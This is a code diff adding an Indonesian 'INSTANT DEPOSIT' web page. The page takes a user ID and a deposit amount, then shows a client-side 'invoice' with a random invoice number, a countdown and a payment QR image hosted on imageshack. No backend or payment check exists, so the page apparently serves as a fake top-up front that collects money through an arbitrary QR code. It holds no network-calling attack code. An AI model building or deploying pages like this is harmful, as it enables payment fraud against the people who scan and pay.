@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>INSTANT DEPOSIT</title>
+  <style>
+    body {
+      background: #1e1e1e;
+      color: #f0f0f0;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background: #2a2a2a;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    input {
+      background: #333;
+      color: #fff;
+    }
+    button {
+      background: #4caf50;
+      color: white;
+      cursor: pointer;
+    }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="container" id="formPage">
+    <h1>INSTANT DEPOSIT</h1>
+    <input type="text" id="userId" placeholder="User ID (12 karakter)" maxlength="12">
+    <input type="text" id="nominal" placeholder="Nominal (min 50.000)">
+    <button onclick="submitForm()">Deposit</button>
+    <button style="background:#2196f3">Bantuan</button>
+  </div>
+
+  <div class="container hidden" id="loadingPage">
+    <h1>Loading...</h1>
+  </div>
+
+  <div class="container hidden" id="invoicePage">
+    <h1>Invoice</h1>
+    <p>No. Invoice: <span id="invoiceNo"></span></p>
+    <p>TGL: <span id="tanggal"></span></p>
+    <p>Batas Pembayaran: <span id="batas"></span></p>
+    <p>Sisa Waktu: <span id="countdown"></span></p>
+    <p>Status: <span id="status">UNPAID</span></p>
+    <p>Keterangan: Topup Instan Deposit (<span id="keterangan"></span>)</p>
+    <p>Jumlah: IDR <span id="jumlah"></span></p>
+    <p>Biaya Layanan: IDR 812</p>
+    <p>Total Bayar: IDR <span id="total"></span></p>
+    <p>Pembayaran via QRIS:</p>
+    <img src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" alt="QRIS">
+  </div>
+
+  <script>
+    function formatRupiah(angka) {
+      return angka.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+    }
+
+    document.getElementById('nominal').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value) e.target.value = formatRupiah(value);
+    });
+
+    function submitForm() {
+      const userId = document.getElementById('userId').value.trim();
+      const nominalInput = document.getElementById('nominal').value.replace(/\./g, '');
+      const nominal = parseInt(nominalInput);
+      if (userId.length !== 12 || isNaN(nominal) || nominal < 50000) {
+        alert("Pastikan User ID 12 karakter dan nominal minimal 50.000");
+        return;
+      }
+
+      document.getElementById('formPage').classList.add('hidden');
+      document.getElementById('loadingPage').classList.remove('hidden');
+
+      setTimeout(() => {
+        document.getElementById('loadingPage').classList.add('hidden');
+        document.getElementById('invoicePage').classList.remove('hidden');
+
+        const invoice = 'INV' + Math.floor(Math.random() * 1000000);
+        const now = new Date();
+        const batas = new Date(now.getTime() + 10 * 60000);
+
+        document.getElementById('invoiceNo').textContent = invoice;
+        document.getElementById('tanggal').textContent = now.toLocaleString();
+        document.getElementById('batas').textContent = batas.toLocaleString();
+
+        document.getElementById('keterangan').textContent = formatRupiah(nominal);
+        document.getElementById('jumlah').textContent = formatRupiah(nominal);
+        document.getElementById('total').textContent = formatRupiah(nominal + 812);
+
+        let countdown = 600;
+        const interval = setInterval(() => {
+          const min = Math.floor(countdown / 60);
+          const sec = countdown % 60;
+          document.getElementById('countdown').textContent = `${min}:${sec.toString().padStart(2, '0')}`;
+          if (--countdown < 0) {
+            clearInterval(interval);
+            document.getElementById('status').textContent = 'EXPIRED';
+            document.getElementById('countdown').textContent = '0:00';
+          }
+        }, 1000);
+      }, 3000);
+    }
+  </script>
+</body>
+</html>
